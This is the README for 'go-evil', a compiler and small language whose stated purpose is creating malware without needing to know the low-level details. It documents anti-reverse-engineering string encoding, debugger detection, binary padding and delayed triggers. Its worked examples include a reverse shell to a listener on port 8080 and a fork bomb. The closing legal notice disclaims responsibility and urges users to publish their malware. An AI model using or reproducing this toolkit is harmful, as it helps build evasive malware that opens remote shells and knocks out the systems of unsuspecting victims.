# Go-evil - Customizing evil has never been so easy

<img src="./images/logo.png" width="1000"/>

[![Builds](https://github.com/s9rA16Bf4/go-evil/actions/workflows/builds.yml/badge.svg)](https://github.com/s9rA16Bf4/go-evil/actions/workflows/builds.yml)
[![Builds all examples](https://github.com/s9rA16Bf4/go-evil/actions/workflows/compile_examples.yml/badge.svg)](https://github.com/s9rA16Bf4/go-evil/actions/workflows/compile_examples.yml)
[![Passes all tests](https://github.com/s9rA16Bf4/go-evil/actions/workflows/unit_tests.yml/badge.svg)](https://github.com/s9rA16Bf4/go-evil/actions/workflows/unit_tests.yml)
[![Code quality](https://github.com/s9rA16Bf4/go-evil/actions/workflows/codeql.yml/badge.svg)](https://github.com/s9rA16Bf4/go-evil/actions/workflows/codeql.yml)

## Table of contents
<!--ts-->
   * [Description](#Description)
   * [Cloning](#Cloning)
   * [Installation](#Installation)
      * [Docker](#Docker)
      * [Locally](#Locally)
   * [Anatomy of a go-evil based malware](#anatomy-of-a-go-evil-based-malware)
        * [Strings](#Strings)
        * [Function types](#Function-types)
        * [Skeleton](#skeleton)
        * [Compiler configuration](#compiler-configuration)
        * [Predefined variables](#predefined-variables)
   * [Examples](#Examples)
        * [Hello world](#Hello-world)
        * [If/else statements](#If/else-statements)
        * [Foreach](#Foreach)
        * [Generating 32 random functions](#Generating-32-random-functions)
        * [Wait until](#Wait-until)
        * [Connecting a javascript button to a call function](#Connecting-a-javascript-button-to-a-call-function)
        * [Reverse shell](#Reverse-shell)
        * [Fork bomb](#Fork-bomb)

   * [Utilizing your own domain](#Utilizing-your-own-domain)

   * [Documentation](#Documentation)
        * [Examples](#examples)
        * [Godoc](#Godoc)
        * [Cookbook](#cookbook)
* [Legal notice](#legal-notice)

<!--te-->

## Description
Go-evil is a red teams wet dream, a tool to beat all other tools of it's kind.<br>
What is go-evil, I hear you ask? Go-evil is a project all about the art of creating malware with a simpel language.<br>
The programming language we utilize is called evil, which only purpose is to translate ideas like "Hey I want a backdoor" into working code without the malware artist needing to know every every nook and cranny.<br> 

## Cloning
To make sure that you get everything needed to start working on your malware you will need to do one out of the following things.
1. Run `git clone --recurse-submodules <URL>` to clone the base project and each submodule
2. Run `make submodules` once you have cloned the project to fetch the submodules


## Installation
### Docker
You can run the compiler through docker and by executing the statements shown below!

Run `make docker` to build the docker image.

Create a folder labeled `builds` in your local directory, this will be the directory where you want to place all your files to compile.

Run the following command `docker run -v $(pwd)/builds:/app/builds --rm goevil/gevil-<version> <commands>`

An example of this can be `docker run -v $(pwd)/builds:/app/builds --rm goevil/gevil-2.7 -f builds/out.evil -bd builds` which will compile the `out.evil` file and create the binary `builds/out`.

But if you're lazy you can also utilize the script labeled `gevil` under the `tools` directory `bash tools/gevil <commands>` which will do all work for you.

### Locally
If you still want to compile the project locally, just run `make dependencies` and `make` to compile the project. After this you can utilize the compiler as intended. 

## Anatomy of a go-evil based malware

### Strings
All user definied strings in a 'goevil created malware' are represented as an integer array, this to prevent the possibilty to dump the strings when reverse engineering or atleast making it harder.

The standard alphabet utilized for this is,
```0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,!,#,$,€,%,&,(,),*,+,,,-,.,/,:,;,<,=,>,?,@,[,],^,_,`,{,|,},~```

Goevil will read the alphabet linearly and represent the character with the index of said character in a array that is constructed during compile-time and runtime.

This alphabet can easily be changed with the `-A`/`--alphabet` parameter which needs a comma-seperated string just like how the standard alphabet above is presented.

### Function types
We have currently four different functions, these are marked by a unique name preceding the functions name.<br/>

| Function type | Description | Extra |
|--------------|-----------|-----------|
| boot | Executed at the beginning of the malware | - |
| loop | Placed and executed within a for-loop | - |
| call | Manually needs to be called | Binding and utilizing `self::call("<function_name>")` can solve this |
| end | Executed just before the malware exits | - |

### Skeleton
Shown below is the general skeleton that each malware compiled by goevil has in their source code.
```
package main

import(
    ...
)

// Structs

// Consts

// Global variables
...

// Function def
...

func main(){
    // Calling `boot` functions
    ...

    for <behavior pattern> {
        // Calling `loop` functions
        ...
    }

    // Calling `end` functions
}

```

### Compiler configuration
Each go-evil malware require a so-called `Compiler configuration`.
```
[
    <Compiler configuration>
]
```
The compiler configuration informs the compiler on how the malware should be configured and compiled and can contain the following fields.

| Field | Description | Value type |
|--------------|-----------|-----------|
| version | Target compiler version | string |
| output | The name of the malware after being compiled | string |
| os | Target operating system | string |
| arch | Target architecture | string |
| obfuscate | Should the source code be obfuscated? | boolean |
| debugger_behavior | How should the malware react if it detects a debugger? | string |

Most of these values are the same as the flags that can be sent in through the argument parser and any sent in args will overwrite what the compiler configuration contains.

### Predefined variables

There exist two types of variables in go-evil.
1. Compile-time `$<value>$`
2. Runtime      `€<value>€`

They exist during two different times in the lifespan of a malware and their names indicate where they are utilized.

| Value | Compile time | Runtime | Description |
|--------------|-----------|------------|------------|
| 1 - 5 | X | X | Variables that the user can utilize |
| 13 | - | X | Each value in a foreach is placed in `€13€`|
| 23 | X | X | Returns the executables name  |
| 39 | X | X | Grabs the current working directory |
| 40 | X | X | Grabs the path to the current user's home directory |
| 666 | X | X | Grabs the current user's name |

The pattern that emerges here is that most variables do the exact same thing with the exception of in which stage they are parsed and set. E.g. the username obtained through `$666$` might not be the same as the one in `€666€`.

## Examples
### Hello world
```
@ Showcases how you print a message @

use system

[
    version 3.0
    output out
    os linux
    arch amd64
    obfuscate false
]


b boot {
    system::outln("Hello from boot!")
}

l main_func {
    system::outln("Hello from main!")
    system::exit("0")
}
```

### If/else statements
```
@ Showcases how an if/else statement looks like @
@ The allowed operators are... @
@ > - larger @
@ < - smaller @
@ == - equals @
@ != - does not equal @
@ >= - larger or equals @
@ <= - smaller or equals @

use system
use self

[
    version 3.0
    output if_else
    os linux
    arch amd64
    obfuscate false
    debugger_behavior stop
]


l main_func {
   
    if(${"1", ">", "2"}$):
        system::outln("1 is bigger than 2")
    else:
        system::outln("1 is smaller than 2")
    end if

    system::exit("0")
}
```
### Foreach
```
@ Showcases how a for-loop/foreach-loop works @

use system

[
    version 3.0
    output foreach
    os linux
    arch amd64
    obfuscate false
    debugger_behavior stop
]


l main_func {
    foreach(${"1","2","3","4","5"}$):
        system::outln("€13€") @ The index €13€ is configured to only be used by foreach loops @
    end foreach
    
    system::exit("0")
}
```

### Generating 32 random functions
```
@ This example shows that go-evil v2 has the ability to add an n amount of @
@ random function to your source code, which can act like a padding @
@ but can also act like a factor to make it harder to reverse-engineer @

use system
use self

[
    version 3.0
    output random_func
    os linux
    arch amd64
    obfuscate false
    debugger_behavior stop
]


l main_func {
    self::add_random_func("32") @ Adds 32 randomly definied functions to the src code @
    system::outln("The definied functions don't effect the program itself, but sure as hell padds out the binary file")
    system::outln("Compile with the debug flag to see the result")

    system::exit("0")
}

```

### Wait until
```
@ Shows the until function in the time domain @
@ Supported formats @
@ - YYYY/MM/DD-hh:mm @ 
@ - hh:mm @

use system
use time

[
    version 3.0
    output until
    os linux
    arch amd64
    obfuscate false
    debugger_behavior stop
]

l main_func {
    time::until("10:45") @ The program will launch after 10:45 @
    system::outln("Hello I've launched!!")
    
    system::outln("Let us try this again!!")
    
    time::until("2023/04/09-10:50")
    system::outln("Finishing up!")

    system::exit("0")
}
```


### Connecting a javascript button to a call function
```
@ Showcasing how you can bind an evil function to a javascript call @

use system
use window

[
    version 3.0
    output bind
    os linux
    arch amd64
    obfuscate false
]

c test1 -> null {
    system::outln("I've been summoned!")
}

b bind {
    @ Essentially saying that when the js function button is called, call test1 @
    window::bind(${"button", "test1"}$) @ The ${...}$ is known as an evil array @ 

    window::js("function testing() {window.button();}")

    window::html("<p>Watch the console after pressing the button!</p>")
    window::html("<input type='submit' onclick='testing()'>")

    window::run()
}

l loop {
    system::exit("0")
}
```

Running the code above will result in the following
![image](https://user-images.githubusercontent.com/14398606/189844664-0d870f9a-4a27-401f-a6ec-619fb8556cd4.png)

### Reverse shell
```
@ Performs a reverse shell back to the attacker @
@ To check if the reverse shell works, run the following nc -l 8080 @

use system
use network

[
    version 3.0
    output reverse_shell
    os linux
    arch amd64
    obfuscate false
    debugger_behavior stop
]


l main_func {
    network::reverse_shell(${"127.0.0.1", "8080"}$)

    system::exit("0")
}
```

### Fork bomb
```
@ Executes a fork bomb @

use system
use bombs
use time

[
    version 3.0
    output fork_bomb
    os linux
    arch amd64
    obfuscate false
    debugger_behavior stop
]

c executioner -> boolean { @ When this function returns, the bomb is executed @
    system::outln("I'm the bomb!")
    time::sleep("600") @ Sleep for 10 minutes before returning @
}

l main_func {
    system::outln("Warning: Do not try this on your own machine!")
    bombs::fork_bomb(${"500", "executioner"}$) @ 500 ms until it blows up @
    system::exit("0")
}
```

## Utilizing your own domain
Writting and including your own thirdparty domain is a simple process.
First we start with creating a directory where the thirdparty domains can be found, such as `thirdparty_domain`. This directory will need to be passed through the `-xdp`/`--external_domain_path` argument each time you want to compile your project.

You will in this folder create a new folder for each of those domains that you want to create. An example can be `test` meaning that the current path will be `thirdparty_domain/test`. This folder name will also be the domain that you will import in your evil code, e.g. `use test`.

Within the `test` folder you must create a file called `parser.go` that has a function defined with the following header.

```
func Parser(function string, value string, data_object *json.Json_t) []string
```

This function will be the entrypoint that goevil will look for and utilize and will be where you can do whatever you want.

For the domain to be importable you will need in the `thirdparty_domain/test` directory run the following command `go build -buildmode=plugin` which will create a shared object, `test.so` that goevil will work with.

## Documentation
### Examples
We strive to have a corresponding example file/files for each implemented feature, meaning that the currently best way to see how to implemenet a certain area
is to look in the `examples` folder
### Godoc
If you're willing to see all the possible functions and such, take a look at  `tools/serve_documentation.sh` which will locally host a godoc server on port 8080
### Cookbook
We are also working on a so-called "cookbook" which will go into a further detail on how everything works. But this book is not yet completed.

## Legal notice
We take no responsibility for what you create and do with this project. Any mischief that you cause and happen to fall into is on yourself!
But we do encourage open sourcing your malware so that the world can see your art!



